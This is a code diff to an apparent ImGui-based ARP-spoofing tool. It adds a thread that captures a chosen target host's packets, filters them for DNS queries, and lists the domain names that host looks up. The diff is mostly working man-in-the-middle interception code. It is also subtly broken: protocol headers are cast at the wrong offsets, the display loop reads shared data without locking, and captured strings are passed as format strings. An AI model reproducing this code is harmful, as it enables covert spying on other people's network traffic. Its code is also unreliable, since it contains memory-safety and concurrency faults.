@@ -2,10 +2,21 @@
 #include "imgui/imgui.h"
 #include <WS2spi.h>
 #include <thread>
+#include <mutex>
+
+#define CHECK_TO_BLINK_ELEMENT (fmodf((float)ImGui::GetTime(), 0.80f) < 0.34f)
+#define INTERCEPTED_PACKET_BUFFER_SIZE 200
+
+typedef std::shared_ptr<GenericPacket> GenericPacketRef;
+typedef std::pair<PacketHeader, GenericPacketRef> PacketNode;
+
+static std::vector<PacketNode> s_intercepted_packets;
+static std::mutex s_packet_interception_mutex;
 
 void ClientApplication::init()
 {
 	set_dark_theme_colors();
+	s_intercepted_packets.clear();
 
 	m_adapter_list.find_adapters();
 }
@@ -270,7 +281,10 @@ void ClientApplication::render_mitm_attack_data()
 		if (!m_mitm_data.attack_in_progress)
 		{
 			if (ImGui::Button("Initiate Attack", ImVec2(110, 25)))
+			{
 				start_arp_spoofing_loop();
+				start_traffic_interception_loop();
+			}
 		}
 		else
 		{
@@ -278,9 +292,12 @@ void ClientApplication::render_mitm_attack_data()
 			if (!m_mitm_data.rearping_in_progress)
 			{
 				if (ImGui::Button("Stop Attack", ImVec2(110, 25)))
+				{
+					s_intercepted_packets.clear();
 					stop_attack_and_restore_arp_tables();
+				}
 			}
-			else if (fmodf((float)ImGui::GetTime(), 0.80f) < 0.34f)
+			else if (CHECK_TO_BLINK_ELEMENT)
 			{
 				ImGui::Text("Re-Arping Targets...");
 			}
@@ -376,7 +393,7 @@ void ClientApplication::render_intercepted_traffic_window()
 	ImGui::SetNextWindowSize(ImVec2(500, 400));
 	ImGui::Begin("Intercepted Traffic");
 
-	if (!m_mitm_data.attack_in_progress)
+	if (!m_mitm_data.attack_in_progress || m_mitm_data.rearping_in_progress)
 	{
 		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
 		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
@@ -385,7 +402,23 @@ void ClientApplication::render_intercepted_traffic_window()
 	}
 	else
 	{
+		// Create a clone to avoid issues with multithreading
+		for (auto& [header, packet_ref] : s_intercepted_packets)
+		{
+			// Skip over faulty packets
+			if (!packet_ref)
+				continue;
 
+			DnsLayer* dns_layer = reinterpret_cast<DnsLayer*>(packet_ref->buffer);
+
+			ImGui::Text("DNS Query: ", header.len);
+
+			if (htons(dns_layer->qdcount) == 1)
+			{
+				ImGui::SameLine();
+				ImGui::Text(extract_dns_query_qname(dns_layer).c_str());
+			}
+		}
 	}
 
 	ImGui::End();
@@ -464,4 +497,52 @@ void ClientApplication::stop_attack_and_restore_arp_tables()
 		m_mitm_data.rearping_in_progress = false;
 	});
 	rearp_thread.detach();
+}
+
+void ClientApplication::start_traffic_interception_loop()
+{
+	std::thread interception_thread([this]() {
+		while (m_mitm_data.attack_in_progress &&
+			!m_mitm_data.rearping_in_progress)
+		{
+			auto packet = std::make_shared<GenericPacket>();
+			PacketHeader header;
+
+			net_utils::recv_packet(&header, packet->buffer, MAX_PACKET_SIZE);
+
+			EthLayer* eth_layer = reinterpret_cast<EthLayer*>(packet->buffer);
+
+			// Check if the packet was originated from the target host
+			bool target_is_sender = memcmp(eth_layer->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;
+
+			if (!target_is_sender)
+				continue;
+
+			// Testing DNS filter
+			if (eth_layer->protocol != htons(PROTOCOL_IPV4))
+				continue;
+
+			IpLayer* ip_layer = reinterpret_cast<IpLayer*>(packet->buffer);
+			if (ip_layer->protocol != PROTOCOL_UDP)
+				continue;
+
+			UdpLayer* udp_layer = reinterpret_cast<UdpLayer*>(packet->buffer);
+			if (udp_layer->dest_port != htons(PORT_DNS))
+				continue;
+
+			// Lock the mutex
+			s_packet_interception_mutex.lock();
+
+			// Check if packet node buffer needs to be partially freed up
+			if (s_intercepted_packets.size() > INTERCEPTED_PACKET_BUFFER_SIZE)
+				s_intercepted_packets.resize(s_intercepted_packets.size() - (INTERCEPTED_PACKET_BUFFER_SIZE / 4));
+
+			// Insert the packet node
+			s_intercepted_packets.insert(s_intercepted_packets.begin(), { header, packet });
+
+			// Unlock the mutex
+			s_packet_interception_mutex.unlock();
+		}
+	});
+	interception_thread.detach();
 }
